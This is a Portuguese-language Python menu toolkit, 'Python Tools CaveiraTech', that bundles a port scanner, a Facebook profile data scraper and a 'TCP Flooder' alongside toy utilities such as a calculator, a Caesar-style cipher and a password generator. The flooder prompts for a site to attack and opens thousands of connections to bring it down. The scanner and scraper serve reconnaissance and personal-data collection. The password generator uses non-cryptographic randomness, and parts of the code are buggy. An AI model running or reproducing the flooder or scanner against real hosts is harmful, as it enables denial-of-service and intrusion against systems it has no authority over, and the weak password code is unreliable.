def tudo():
    #/usr/bin/env python
    #!coding:latin_1
 
 
    import time
 
    print('''
      .o oOOOOOOOo                                            OOOo
      Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
      OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
      OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
      `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
      .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
      OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
     oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
    oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
   OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
   "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
      Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
      :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
      .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                   '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                        `$"  `OOOO' `O"Y ' `OOOO'  o             .
      .                  .     OP"          : o     .
                                :
                                .
                       Python Tools CaveiraTech
                              By Zeek
 
                             Programas por:
                              @EXPL01T3R
                              @Sun Tzu
                              @Zeek
   ''')
 
    print('''
                                ID's:
                      -------------------------
             [+]1 - Scanning          | [+]4 - Cryptografia
             [+]2 - Info Gathering    | [+]5 - Segurança
             [+]3 - Dos               | [+]6 - Miscelânea
 
                      -------------------------
   ''')
 
    def portscanner():
        #/usr/bin/env python
        #!-*- coding:latin_1 -*-
        import socket
        import threading
        from queue import Queue
        import time
 
        creditos = '''
 
                   Simple Port Scanner Beta Version
                               By Zeek
       '''
 
        print(creditos)
 
        if creditos != '''
 
                   Simple Port Scanner Beta Version
                               By Zeek
       ''':
            print('Créditos modificados')
            time.sleep(2)
            print('Desenvolvido por Zeek')
            time.sleep(2)
            print('Saindo...')
            time.sleep(4)
            quit()
 
 
 
        ser = input('[+]Servidor: ')
 
 
        if 'http://' in ser:
            ser = ser.replace('http://', '')
            ser = ser.replace('www.','')
            ser = ser.replace('/','')
 
        elif 'https://' in ser:
            ser = ser.replace('https://','')
            ser = ser.replace('www.','')
            ser = ser.replace('/','')
 
        elif 'www.' in ser:
            ser = ser.replace('www.','')
            ser = ser.replace('/','')
 
 
        ser = str(ser)
 
        print('[!]Servidor definido:', ser)
        time.sleep(2)
 
        porta = int(input('[+]Scannear até a porta: '))
 
        quantidade = porta / 2
 
        print('[!]Intensidade recomendada definida baseada no número de portas e em eficiência!')
        time.sleep(1)
 
        thr = input('[+]Intensidade do scan [%d = Recomendado]: ' %quantidade) #Intensidade = Threading do scan , ou seja , vai definir os request's...
        thr = int(thr)
        thr1 = range(thr)
 
 
        print('[!]Analisando %d portas' %porta)
        time.sleep(1)
 
        porta = int(porta) + 1
        portas1 = range(1, porta)
 
        host_ip = socket.gethostbyname(ser)
        print('[!]Analisando',ser,'|',host_ip,'\n')
        time.sleep(2)
                   
 
 
        print_lock = threading.Lock()
 
        target = ser
 
        print('PORTA       ESTADO')
 
 
        def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                con = s.connect((target,port))
                with print_lock:
                    print(port,'/tcp     aberta')
                con.close()
            except:
                pass
        def threader():
            while True:
                worker = q.get()
                portscan(worker)
                q.task_done()
 
        q = Queue()
        for x in thr1:
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()
 
        start = time.time()
 
        for worker in portas1:
            q.put(worker)
 
        q.join()
 
        tempo = time.time()-start
 
        print('Scan realizado em: %.2f sec(s)' %tempo)
 
 
 
    def facebookinfo():
        #/usr/bin/env python
        #!-*- coding:latin_ -*-
 
        import urllib.request
        from pprint import pprint
        import json
        import time
 
        k = 0
 
        while k < 30:
            k = k + 1
 
            creditos = '''
           Coleta de informações básicas do Facebook Profile
                               By Zeek
           '''
            print(creditos)
 
            url = input('[+]Url do usuário: ').replace('https://www.','https://graph.')
 
            resq = urllib.request.urlopen(url).read()
 
            dat = json.loads(resq.decode('latin_1'))
 
            print('[!]Salvando e imprimindo os dados...')
            time.sleep(5)
 
            arquivo = open('DadosFacebook.txt', 'w')
 
            filtro = str(dat)
 
            salvo = arquivo.write(filtro)
 
            print('[!]Dados Salvos em "DadosFacebook.txt" no local do programa.')
            time.sleep(5)
 
            arquivo.close()
 
            print('[!]Dados coletados:')
            time.sleep(3)
 
            pprint(dat)
            time.sleep(5)
            print('''
           Agradecimentos especiais a :
 
           @Rei_Gelado , @EXPL01T3R
 
           ''')
            sair = int(input('[!]Deseja sair?(1 = sim ou 0 = nao): '))
            if sair == 1:
                print('[-]Saindo ...')
                time.sleep(2)
                break
                quit()
        quit()
 
    def tcpflood():
        #/usr/bin/env python
        #-*- coding:latin_1 -*-
 
        import socket
        import time
        import argparse
 
        creditos = '''
 
                                      Simple TCP Flooder
                                         BETA VERSION
                                           By Zeek
       '''
        print (creditos)
        if creditos != '''
 
                                      Simple TCP Flooder
                                         BETA VERSION
                                           By Zeek
       ''':
            print('Creditos modificados!')
            time.sleep(2)
            print('Desenvolvido por Zeek')
            time.sleep(2)
            print('Saindo...')
           
            time.sleep(5)
            quit()
 
        tudo = 0
        while tudo <= 100:
            h = input('Site que deseja atacar: ')
 
            f = 'http://' in h
            f1 = 'https://' in  h
 
            if f or f1 == True:
                print('Favor digite o site sem http:// ou https://!')
                time.sleep(2)
                quit()
 
            p = input('Porta que deseja atacar(80 default): ')
            if p == '':
                p = ('80')
                p = int(p)
            else:
                p = int(p)
 
 
            host = (h)
            port = (p)
 
            loop = 0
            while loop < 10000:
                loop = loop + 1
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((host,port))
                print('Atacando o servidor')
                if socket.timeout == True:
                    print('O servidor %s:%i caiu!' %(host,port))
                    break
 
            print('Ataque Finalizado')
            time.sleep(2)
            sair = str(input('Deseja sair?: '))
            if sair == 'sim' or 'Sim' or 's' or 'S' or 'y' or 'Y' or 'yes' or 'YES':
                break
        print('Obrigado por testar o programa')
        time.sleep(2)
        print('Desenvolvido por Zeek')
        time.sleep(2)
        print('Saindo...')
        time.sleep(3)
        quit()
 
    def cesar():
        #coding: utf-8
        def crypt():
            msg = input('[+]Mensagem: ')
            print('César CRIPT\nCRYPT\n---------------')
            print('Exemplo : 0xe')
            temp = (input('Digite a chave para criptografar a mensagem: '))
            chave = sum(ord(x) for x in temp)    
            msgcrpt = [ord(x)+chave for x in msg]
            msg = ''.join(chr(x) for x in msgcrpt)
            print(msg)
           
        def decrypt():
            msg = input('[+]Mensagem: ')
            print('César CRIPT\nDECRYPT\n---------------')
            temp=(input('Digite a chave para descriptografar a mensagem: '))
            chave=sum(ord(x) for x in temp)
            msgcrpt=[ord(x)-chave for x in msg]
            msg=''.join(chr(x) for x in msgcrpt)
            print(msg)
 
        print('''
 
       César Crypt|Decrypt
           By EXPL01T3R
           
       ''')
        a = input('Deseja encryptar ou descryptografar a  mensagem? [ 1 = Crypt | 2 = Decrypt]: ')
        a = int(a)
        if a == 1:
            crypt()
        elif a == 2:
            decrypt()
        else:
            print('Como veio parar aqui')
            quit()
 
    def calculadora():
        v1 = int(input('Digite o Valor de A: '))
        v2 = int(input('Digite o Valor de B: '))
 
        soma = v1 + v2
 
        subtração = v1 - v2
 
        divisão = v1 / v2
 
        multiplicação = v1 * v1
 
        print('\nA soma de',v1,'+',v2,'é:', soma)
 
        print('\nA subtração de',v1,'por',v2,'é:', subtração)
 
        print('\nA divisão de',v1,'por',v2,'é:', divisão)
 
    def senha():
        import random
        import string
        import time
 
        def mkpass(size=16):
            chars = []
            chars.extend([i for i in string.ascii_letters])
            chars.extend([i for i in string.digits])
            chars.extend([i for i in '\'"!@#$%&*()-_=+[{}]~^,<.>;:/?'])
           
            passwd = ''
           
            for i in range(size):
                passwd += chars[random.randint(0,  len(chars) - 1)]
               
                random.seed = int(time.time())
                random.shuffle(chars)
               
            return passwd
        print('Gerando a senha...')
        time.sleep(2)
        print (mkpass())
 
    def tabuada():
        # by Sun
 
        tabuada = 1
        while tabuada <= 10 :
            n = 1
            print("\nTabuada %d \n" %tabuada)
            while n <= 10 :
                print("%d X %d = %d" %(tabuada, n, tabuada * n))
                n = n + 1
            tabuada = tabuada + 1
    def calculator():
        #Calculadore aushausahuahs
 
        import time
 
 
        print('''
 
                                Simple Calculator
                                     By Zeek
       ''')
 
        a = str(input('Deseja:  somar | subtrair | multiplicar | dividir : '))
 
        if a == 'somar':
            b = int(input('Sua soma tem quantas incógnitas?[Max: 5]: '))
 
            if b == 1:
                print('Favor forneça pelo menos 2 elementos')
                time.sleep(2)
                quit()
 
            if b == 2:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) + int(b)
                print(a,'+',b,'=',resultado)
                print(resultado,'é o resultado da soma de',a,'+',b)
 
            if b == 3:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) + int(b) + int(c)
                print(a,'+',b,'+',c,'=',resultado)
                print(resultado,'é o resultado da soma de',a,'+',b,'+',c)
 
            if b == 4:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) + int(b) + int(c) + int(d)
                print(a,'+',b,'+',c,'+',d,'=',resultado)
                print(resultado,'é o resultado da soma de',a,'+',b,'+',c,'+',d)
            if b == 5:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                e = int(input('Valor de E: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) + int(b) + int(c) + int(d) + int(e)
                print(a,'+',b,'+',c,'+',d,'+',e,'=',resultado)
                print(resultado,'é o resultado da soma de',a,'+',b,'+',c,'+',d,'+',e)
 
        if a == 'subtrair':
            b = int(input('Sua subtração tem quantas incógnitas?[Max: 5]: '))
 
            if b == 1:
                print('Favor forneça pelo menos 2 elementos')
                time.sleep(2)
                quit()
 
            if b == 2:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) - int(b)
                print(a,'-',b,'=',resultado)
                print(resultado,'é o resultado da subtração de',a,'-',b)
 
            if b == 3:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) - int(b) - int(c)
                print(a,'-',b,'-',c,'=',resultado)
                print(resultado,'é o resultado da subtração de',a,'-',b,'-',c)
 
            if b == 4:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) - int(b) - int(c) - int(d)
                print(a,'-',b,'-',c,'-',d,'=',resultado)
                print(resultado,'é o resultado da subtração de',a,'-',b,'-',c,'-',d)
            if b == 5:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                e = int(input('Valor de E: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) - int(b) - int(c) - int(d) - int(e)
                print(a,'-',b,'-',c,'-',d,'-',e,'=',resultado)
                print(resultado,'é o resultado da subtração de',a,'-',b,'-',c,'-',d,'-',e)
 
 
        if a == 'multiplicar':
            b = int(input('Sua multiplicação tem quantas incógnitas?[Max: 5]: '))
 
            if b == 1:
                print('Favor forneça pelo menos 2 elementos')
                time.sleep(2)
                quit()
 
            if b == 2:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) * int(b)
                print(a,'*',b,'=',resultado)
                print(resultado,'é o resultado da multiplicação de',a,'*',b)
 
            if b == 3:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) * int(b) * int(c)
                print(a,'*',b,'*',c,'=',resultado)
                print(resultado,'é o resultado da multiplicação de',a,'*',b,'*',c)
 
            if b == 4:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) * int(b) * int(c) * int(d)
                print(a,'*',b,'*',c,'*',d,'=',resultado)
                print(resultado,'é o resultado da multiplicação de',a,'*',b,'*',c,'*',d)
            if b == 5:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                e = int(input('Valor de E: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) * int(b) * int(c) * int(d) * int(e)
                print(a,'*',b,'*',c,'*',d,'*',e,'=',resultado)
                print(resultado,'é o resultado da multiplicação de',a,'*',b,'*',c,'*',d,'*',e)
         
        if a == 'dividir':
            b = int(input('Sua divisão tem quantas incógnitas?[Max: 5]: '))
 
            if b == 1:
                print('Favor forneça pelo menos 2 elementos')
                time.sleep(2)
                quit()
 
            if b == 2:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) / int(b)
                print(a,'/',b,'=',resultado)
                print(resultado,'é o resultado da divisão de',a,'/',b)
 
            if b == 3:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) / int(b) / int(c)
                print(a,'/',b,'/',c,'=',resultado)
                print(resultado,'é o resultado da divisão de',a,'/',b,'/',c)
 
            if b == 4:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) / int(b) / int(c) / int(d)
                print(a,'/',b,'/',c,'/',d,'=',resultado)
                print(resultado,'é o resultado da divisão de',a,'/',b,'/',c,'/',d)
            if b == 5:
                a = int(input('Valor de A: '))
                b = int(input('Valor de B: '))
                c = int(input('Valor de C: '))
                d = int(input('Valor de D: '))
                e = int(input('Valor de E: '))
                print('Calculando...')
                time.sleep(2)
                resultado = int(a) / int(b) / int(c) / int(d) / int(e)
                print(a,'/',b,'/',c,'/',d,'/',e,'=',resultado)
                print(resultado,'é o resultado da divisão de',a,'/',b,'/',c,'/',d,'/',e)
 
   
    def correios():
        import json
        from urllib import request
 
 
        termo = input('Código de rastreamento: ')
        url = 'http://developers.agenciaideias.com.br/correios/rastreamento/json/{}' .format(termo)
        acessa = request.urlopen(url).read()
        jsn = json.loads(acessa.decode('utf-8'))
        for x in jsn:
            print('Data: {data}\nAção: {acao}\nDetalhes: {detalhes}\nLocal: {local}\n{separador}' .format(data=x['data'], acao=x['acao'], detalhes=x['detalhes'], local=x['local'],separador=(20*'-')))
 
    a = int(input('[+]ID > '))
 
    if a == 1:
        print('''
----------------
[-]0 - Voltar
 
[+]1 - Port Scanner | By @Zeek
----------------
   ''')
        b = int(input('ID >> '))
        if b == 1:
            portscanner()
        elif b == 0:
            tudo()
        else:
            print ('Como veio parar aqui?!')
            time.sleep(2)
            quit()
 
 
    if a == 2:
        print('''
------------------------------------------
[-]0 - Voltar
 
[+]1 - Facebook Profile Info Gathering | @By Zeek
------------------------------------------
   ''')
        b = int(input('ID >> '))
        if b == 1:
            facebookinfo()
        elif b == 0:
            tudo()
        else:
            print('Como veio parar aqui?!')
            time.sleep(2)
            quit()
    if a == 3:
        print('''
---------------------
[-]0 - Voltar
 
[+]1 - TCP Flooder | By @Zeek
---------------------
   ''')
        b = int(input('ID >>'))
        if b == 1:
            tcpflood()
        elif b == 0:
            tudo()
        else:
            print('Como veio parar aqui?!')
            time.sleep(2)
            quit()
    if a == 4:
        print('''
----------------------------
[-]0 - Voltar
 
[+]1 - Cryptografia de César|By @EXPL01T3R
----------------------------
   ''')
        b = int(input('ID >>'))
        if b == 1:
            cesar()
        elif b == 0:
            tudo()
        else:
            print('Como veio parar aqui?!')
            time.sleep(2)
            quit()
 
    if a == 5:
        print('''
---------------------------
[-]0 - Voltar
 
[+]1- Password Generator | By Sun Tzu
---------------------------
   ''')
        b = int(input('ID >> '))
        if b == 1:
            senha()
        elif b == 0:
            tudo()
        else:
            print('Como veio parar aqui?!')
            time.sleep(2)
            quit()
    if a == 6:
        print('''
-------------------------
[-]0 - Voltar
 
[+]1 - Simple Calculator | By @Sun Tzu
 
[+]2 - Tabuada (1 - 10)  | By @Sun Tzu
 
[+]3 -  Rastreamento de obj. pelos correios | By @EXPL01T3R
 
[+]4 - Simple Calculator | By @Zeek
-------------------------
   ''')
        b = int(input('ID >> '))
        if b == 1:
            calculadora()
        elif b == 2:
            tabuada()
        elif b == 3:
            correios()
        elif b == 4:
            calculator()
        elif b == 0:
            tudo()
        else:
            print('Como veio parar aqui?!')
            time.sleep(2)
            quit()
tudo()
